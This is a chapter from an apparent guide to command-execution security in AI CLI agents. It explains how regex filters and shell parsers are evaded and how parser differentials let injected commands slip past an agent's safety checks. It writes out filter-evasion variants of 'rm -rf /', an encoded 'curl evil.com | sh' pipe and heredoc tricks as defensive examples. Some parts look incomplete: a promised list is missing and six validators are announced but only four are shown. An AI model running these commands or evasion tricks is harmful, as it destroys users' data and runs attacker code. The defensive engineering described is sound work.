Chapter 5: Command Execution Security

Every AI CLI agent eventually needs to run a shell command. The model generates a string -- git status, npm install, python -m pytest -- and the agent passes it to a shell interpreter for execution. This is simultaneously the most useful and most dangerous capability an AI agent possesses. A well-crafted command is indistinguishable from what a senior developer would type. A malicious command -- whether generated by a confused model, injected through prompt manipulation, or smuggled via file content -- has the same destructive potential as an attacker with direct terminal access.

The fundamental challenge: shell commands are strings. They carry no type information, no structure, no inherent safety properties. The string rm -rf / is 9 bytes of ASCII that, executed in a privileged shell, destroys an entire filesystem. The security system must transform that unstructured string into a structured representation it can reason about, classify its intent, and enforce boundaries -- all in milliseconds, for every command the AI generates.

This chapter dissects command execution security for AI agents at every layer: why regex-based defenses fail mathematically, how production systems build multi-phase parsing pipelines, the parser differential problem that creates exploitable gaps between analysis and execution, the 100+ injection patterns that real systems must defend against, and the tree-sitter cross-validation approach that represents the current state of the art.

5.1 The Shell Command Attack Surface

When an AI agent executes shell commands, the attack surface differs fundamentally from traditional command injection (CWE-78). In a web application, command injection requires an attacker to find an input field that reaches a system() call. In an AI agent, every command is constructed dynamically -- the AI model itself is the injection point. Three sources can influence command content:

The threat model for AI command execution is broader than CWE-78 alone. It encompasses:

  • CWE-78 (OS Command Injection): Untrusted data in command strings
  • CWE-88 (Improper Neutralization of Argument Delimiters): Shell metacharacters in arguments
  • CWE-436 (Interpretation Conflict): Parser sees different semantics than the shell
  • CWE-77 (Command Injection): Indirect execution through interpreters (eval, bash -c)

5.2 Why Regex Fails: A Formal Argument

The naive defense -- pattern matching with regular expressions -- fails not because of implementation bugs but because of a fundamental mismatch between the tool and the problem.

Shell syntax is a context-sensitive language. The meaning of a character depends on its surrounding context: a $ inside single quotes is literal text, inside double quotes it triggers variable expansion, and outside quotes it triggers expansion with different word-splitting behavior. A # at the start of a word begins a comment; inside a word it is literal. A ( after a function name starts a definition; after $ it starts command substitution; after < it starts process substitution.

Regular expressions operate on regular languages -- a strict subset of context-free languages, which are themselves a strict subset of context-sensitive languages. This is not a limitation of any particular regex engine. It is a mathematical impossibility established by the Chomsky hierarchy: no finite-state automaton can track the nested, context-dependent state that shell parsing requires.

The practical consequence for security:

# Regex pattern to block: rm\s+-rf\s+/
# Catches:
rm -rf /

# Misses all of these:
rm -rf '/'                    # Single-quoted argument
rm -rf "/"                    # Double-quoted argument  
rm -rf \/                     # Backslash-escaped slash
rm -r -f /                    # Split flags
rm --recursive --force /      # Long-form flags
'r'm -rf /                    # Quote-split command name
r\m -rf /                     # Backslash in command name
$(echo rm) -rf /              # Command substitution
eval "rm -rf /"               # Indirect execution
/bin/rm -rf /                 # Absolute path to binary
command rm -rf /              # Builtin prefix bypass

Each evasion exploits a different shell feature. A regex defender playing whack-a-mole must handle every combination of every feature -- a combinatorial explosion. An attacker needs to find only one combination the regex misses. This asymmetry is why MITRE's CWE-78 description explicitly warns that "blacklist approaches" are "virtually always incomplete."

The Regex Treadmill in Practice

Production AI agents that started with regex defenses followed a predictable trajectory:

  1. Phase 1: Block rm -rf / with a literal regex. Bypassed within hours.
  2. Phase 2: Add 20 regex patterns for common evasions. Bypassed by novel combinations.
  3. Phase 3: Add 50 more patterns. Now the regex set has contradictions -- pattern A blocks a safe command that pattern B allows.
  4. Phase 4: Regex evaluation takes 15ms per command. Users notice latency.
  5. Phase 5: Team decides to build a real parser.

This is the "regex treadmill" -- each new pattern catches the last bypass but not the next one. The attacker's search space (all possible bash syntax) is infinite. The defender's pattern database is finite. The defender always loses given sufficient attacker effort.

5.3 The Multi-Phase Parsing Pipeline

Production AI agent systems replace regex with a structured parsing pipeline. The approach used in Claude Code's bashSecurity.ts -- a 4,400-line TypeScript module -- represents the current state of the art. It operates in three phases, each transforming the command to a higher abstraction level:

    A["Raw Command String<br/>(bytes)"] -->|"Phase 1"| B["Token Stream<br/>(typed tokens)"]
    B -->|"Phase 2"| C["Abstract Syntax Tree<br/>(structural nodes)"]
    C -->|"Phase 3"| D["Security Classification<br/>(risk categories)"]

    B -.- B1["Handles: quoting, escaping,<br/>operators, heredoc markers"]
    C -.- C1["Handles: pipelines, lists,<br/>subshells, redirections"]
    D -.- D1["Handles: command identity,<br/>argument semantics, risk level"]

Phase 1: Tokenization

The tokenizer converts a raw byte string into a stream of typed tokens. It handles the most complex part of shell security: resolving quoting rules so that downstream analysis operates on what the shell will actually execute, not on what the string looks like.

Token types and their security relevance:

Token Type Examples Security Relevance
Word git, status, "hello world" Command names and arguments after quote resolution
Operator &&, \|\|, ;, \|, & Command composition -- each creates a new execution boundary
Redirect >, >>, <, 2>&1 File system side effects from otherwise-safe commands
Assignment VAR=value Environment modification before command execution
HeredocMarker <<EOF, <<'EOF' Multi-line string boundary (450+ lines of handling code)
Comment # text Must be detected to avoid false parsing of # in arguments

The critical tokenizer property: quote normalization. All quoting mechanisms resolve to the same token content. 'rm', "rm", r\m, $'rm', and rm all produce the token Word("rm"). This is the single most important security property. Without it, every downstream check must independently handle all quoting variants -- which is exactly the regex failure mode.

# All tokenize to: Word("rm"), Word("-rf"), Word("/")
rm -rf /
'rm' '-rf' '/'
"rm" "-rf" "/"
r\m -rf \/
$'rm' $'-rf' $'/'

Tokenizer failure modes that matter:

The ANSI-C quoting form $'...' is particularly dangerous. $'\x72\x6d' is the hex encoding of rm. A tokenizer that does not handle this form sees a literal string with dollar signs and hex characters. The shell sees rm. This gap between what the parser sees and what the shell executes is the definition of a parser differential vulnerability.

Phase 2: AST Construction

The AST builder consumes the token stream and constructs a tree representing the command's execution structure:

// AST Node Types
interface SimpleCommand {
  type: 'simple';
  name: string;           // Resolved command name
  args: string[];         // Resolved arguments
  redirects: Redirect[];  // I/O redirections
  assignments: Assignment[]; // Env var prefixes
}

interface Pipeline {
  type: 'pipeline';
  commands: ASTNode[];    // cmd1 | cmd2 | cmd3
  negated: boolean;       // ! cmd1 | cmd2
}

interface CompoundCommand {
  type: 'and' | 'or' | 'sequence';
  left: ASTNode;
  right: ASTNode;
}

interface Subshell {
  type: 'subshell';
  body: ASTNode;          // (cmd1 && cmd2)
}

interface CommandSubstitution {
  type: 'substitution';
  body: ASTNode;          // $(cmd) or `cmd`
}

The tree structure makes every command boundary explicit. The flat string git status && rm -rf / || echo "safe" becomes three SimpleCommand leaves connected by CompoundCommand nodes. Each command is independently classifiable. Recursive structures like $(echo $(echo rm)) -rf / become nested CommandSubstitution nodes that the analyzer can descend into.

Phase 3: Semantic Analysis and Classification

The semantic analyzer walks the AST and assigns security classifications to each node:

Classification Examples Permission Required
READ_ONLY ls, cat, git status, grep None (auto-allow)
DEV_TOOL git, cargo, npm, python Check rules
WRITE git commit, mkdir, touch Ask user or classifier
DESTRUCTIVE rm -rf, dd, mkfs Always ask (or block)
INDIRECT eval, bash -c, python -c Recursive analysis required
NETWORK curl, wget, ssh Ask user or classifier
SYSTEM_MODIFY sudo, chmod 777, systemctl Always ask
UNKNOWN Unrecognized commands Treated as WRITE (conservative default)

The INDIRECT category is the most challenging. When the model generates bash -c "rm -rf /", the outer command is bash (a DEV_TOOL), but the argument contains a DESTRUCTIVE command. The semantic analyzer must recursively parse and classify the argument string, applying the same three-phase pipeline to the inner command.

5.4 Parser Differentials: The Core Vulnerability

A parser differential exists when the security parser interprets a command differently than the shell that executes it. If the parser sees safe_command but the shell executes dangerous_command, the security layer is bypassed completely.

Claude Code's security audit (CVSS 6.8, CWE-436) identified the shell-quote npm package as a single point of failure for parser differentials. The bashSecurity.ts module uses shell-quote for tokenization, but shell-quote was designed for shell construction, not shell security analysis. The divergences between shell-quote's interpretation and actual bash behavior create exploitable gaps.

Carriage Return Injection. The \r (carriage return) character is invisible in most terminal displays but can cause the parser and shell to disagree on command boundaries:

# What the parser sees:
echo "safe"\r; rm -rf /

# What the terminal displays:
rm -rf /        # \r overwrites "echo safe" visually

# What bash executes:
echo "safe"     # First command
rm -rf /        # Second command (after semicolon)

The parser might see a single string "safe\r; rm -rf /" if it does not treat \r as whitespace or command separator. Bash, however, may interpret the \r differently depending on the terminal and readline configuration.

Backslash-Escaped Operators. Shell-quote and bash disagree on whether \&& is a literal string && or a backslash-escaped & followed by &:

echo hello\&&rm -rf /
# shell-quote might parse as: echo "hello&&rm" [one token]
# bash parses as: echo hello\ [with trailing backslash], && [operator], rm -rf /

ANSI-C Quoting Exploits. The $'...' form supports escape sequences that most JavaScript-based parsers handle incompletely:

$'\x63\x75\x72\x6c' evil.com | $'\x73\x68'
# Decodes to: curl evil.com | sh
# Parser sees: literal dollar-sign strings
# Shell sees: curl piped to sh

The Six Misparsing Validators

Claude Code's bashSecurity.ts includes six dedicated validator functions that catch known shell-quote divergences. Each targets a specific parser differential:

Validator What It Catches Why It Exists
validateCarriageReturn \r in command strings Shell-quote ignores \r; bash does not
validateBackslashEscapedOperators \&&, \|\|, \; Escape resolution differs between parsers
validateMalformedTokens Tokens shell-quote cannot parse Fail-open behavior on parse errors
validateAnsiCQuoting $'\xNN' hex/octal escapes Shell-quote partial ANSI-C support

The audit notes a critical concern: these validators catch known divergences but cannot anticipate unknown ones. The 450+ lines of heredoc handling code (isSafeHeredoc) alone represent a substantial attack surface for parser confusion. Novel shell-quote bugs could allow command injection that passes all validators.

5.6 Tree-Sitter Cross-Validation

The most promising advancement in command execution security is cross-validation using multiple independent parsers. If two parsers with different implementations agree on a command's structure, confidence in the analysis is high. If they disagree, the command is flagged for additional scrutiny.

Claude Code's audit recommends adding tree-sitter-bash as a secondary parser alongside shell-quote. Tree-sitter is a parser framework originally built for syntax highlighting in code editors. Its bash grammar is maintained by a different team, uses a different parsing algorithm (GLR vs recursive descent), and was built for a different purpose (highlighting vs quoting). These differences make it an ideal cross-validator: a bug that affects both parsers simultaneously is unlikely because their codebases share no implementation.

Cross-Validation Design

The cross-validation comparison operates at the semantic level, not the token level. Different parsers produce different internal representations, so direct token comparison is meaningless. Instead, the comparison checks higher-level properties:

interface CommandSemantics {
  commands: Array<{
    name: string;           // Resolved command name
    args: string[];         // Resolved arguments
    hasRedirects: boolean;  // Any I/O redirections
    hasSubstitutions: boolean; // Any $() or `` usage
  }>;
  operators: string[];      // Connecting operators (&&, ||, ;, |)
  hasBackgroundJobs: boolean;
}

function crossValidate(
  shellQuoteResult: CommandSemantics,
  treeSitterResult: CommandSemantics
): ValidationResult {
  // Check command count agreement
  if (shellQuoteResult.commands.length !== treeSitterResult.commands.length) {
    return { status: 'divergence', reason: 'command_count_mismatch' };
  }

  // Check each command name agreement
  for (let i = 0; i < shellQuoteResult.commands.length; i++) {
    if (shellQuoteResult.commands[i].name !== treeSitterResult.commands[i].name) {
      return { status: 'divergence', reason: 'command_name_mismatch', index: i };
    }
  }

  // Check operator agreement
  if (!arraysEqual(shellQuoteResult.operators, treeSitterResult.operators)) {
    return { status: 'divergence', reason: 'operator_mismatch' };
  }

  return { status: 'agreement' };
}

Performance Considerations

Running two parsers doubles the parsing cost. For production AI agents, latency matters: every millisecond of parsing delay accumulates across thousands of commands per session.

Parser Typical Latency Memory Overhead
shell-quote (JS) 0.1-0.5ms Minimal (pure JS)
tree-sitter-bash (WASM/native) 0.5-2ms ~5MB WASM module
Combined cross-validation 1-3ms ~5MB additional

The 1-3ms overhead is acceptable for security-critical parsing. For comparison, the AI classifier (Chapter 6) adds 100-300ms when invoked. The cross-validation cost is invisible in the overall tool-call latency budget.

Limitations of Cross-Validation

Cross-validation reduces the parser differential attack surface but does not eliminate it:

  1. Shared blind spots. If both parsers fail to handle a shell construct (e.g., a newly added bash feature), cross-validation reports agreement on the wrong interpretation.
  2. Comparison granularity. The semantic comparison may not catch subtle differences in argument parsing that affect security (e.g., how each parser handles $'\x72\x6d').
  3. False positives. Parsers may legitimately disagree on ambiguous constructs that are not security-relevant, generating noise.

5.7 Heredoc Handling: The 450-Line Problem

Heredocs (here-documents) deserve special attention because they represent the single largest block of parsing code in production bash security modules. Claude Code dedicates 450+ lines to isSafeHeredoc() -- more than any other single construct.

Why heredocs are hard:

# Basic heredoc -- content is literal text
cat <<EOF
Hello world
EOF

# Quoted delimiter -- no variable expansion
cat <<'EOF'
$HOME stays literal
EOF

# Unquoted delimiter -- variable expansion occurs
cat <<EOF
Home is $HOME
$(whoami) runs as command substitution!
EOF

# Tab-stripped heredoc
cat <<-EOF
    Indented content
    EOF

# Heredoc as argument to dangerous command
bash <<EOF
rm -rf /
EOF

The security-critical distinction: a heredoc with a quoted delimiter (<<'EOF') contains literal text. A heredoc with an unquoted delimiter (<<EOF) processes variable expansions and command substitutions. The latter can contain arbitrary code that executes during the heredoc's evaluation -- and that code must be parsed and classified recursively.

The isSafeHeredoc() function must:

  1. Detect whether the delimiter is quoted (literal) or unquoted (expanding)
  2. For expanding heredocs, parse content for $(), backticks, and $(()) arithmetic
  3. Handle nested heredocs (heredoc within a command substitution within a heredoc)
  4. Track heredoc boundaries across multiple commands in a pipeline
  5. Handle the tab-stripping <<- variant without misidentifying the delimiter

Each of these steps has edge cases that create parser differential risk. The audit identifies heredoc handling as the highest attack surface within the bash security module.

5.9 Designing Command Execution Security for New AI Agents

For teams building new AI CLI agents, the lessons from production systems yield concrete design principles:

Principle 1: Never Execute Unparsed Strings

Every command must pass through structured parsing before execution. No exceptions for "simple" commands -- git status is simple until an attacker appends ; curl evil.com | sh and the system skips parsing because the command "looks safe."

Principle 2: Fail Closed on Parse Errors

When the parser cannot understand a command, the safe default is to block it. Claude Code's audit notes that some code paths return empty arrays on parse failure (fail-open behavior). A command the parser cannot understand is a command the security system cannot evaluate -- it should not execute.

Principle 3: Use Multiple Independent Parsers

A single parser is a single point of failure. Cross-validation with a second parser from a different codebase, using a different algorithm, catches implementation bugs in either parser. The cost (1-3ms latency, ~5MB memory) is negligible compared to the security benefit.

Principle 4: Classify Recursively

Commands like eval "rm -rf /", bash -c "curl evil.com | sh", and python -c "import os; os.system('rm -rf /')" contain inner commands that must be extracted and classified. The security pipeline must recurse into every execution context -- subshells, command substitutions, interpreter arguments, heredoc content.

Principle 5: Maintain the Pattern Database as a Living Document

New shell features, parser updates, and security research generate new bypass techniques continuously. The pattern database is not a write-once artifact -- it requires ongoing maintenance, fuzz testing, and adversarial review.

Each layer is independent: a bypass of one layer does not affect the others. The hardcoded block list (Layer 1) catches catastrophic commands even if the parser (Layer 2) is confused. The sandbox (Layer 6) restricts execution even if every upstream layer fails. This independence is the defining property of defense-in-depth, and it is non-negotiable for any AI agent that executes shell commands on behalf of users.

5.10 Key Takeaways

Command execution is the hardest security problem in AI CLI agents. The attack surface is the entire shell language -- a context-sensitive grammar with decades of accumulated features, implementation quirks, and cross-platform divergences. Regex-based defenses fail mathematically. Static pattern databases are necessary but insufficient. Parser differentials create exploitable gaps between analysis and execution.

The state of the art combines multiple defenses: structured multi-phase parsing, cross-validation with independent parsers, maintained injection pattern databases, recursive classification for indirect execution, and kernel-level sandboxing as the final safety net. No single layer is sufficient. The security of command execution depends on the independence and completeness of the entire stack.

As discussed in Chapter 4, CLI agent architecture must place the command execution security module at the narrowest point of the tool dispatch pipeline -- after permission evaluation but before shell invocation. Every command, without exception, passes through this chokepoint. The next chapter examines the permission system that controls which commands reach the execution pipeline at all.
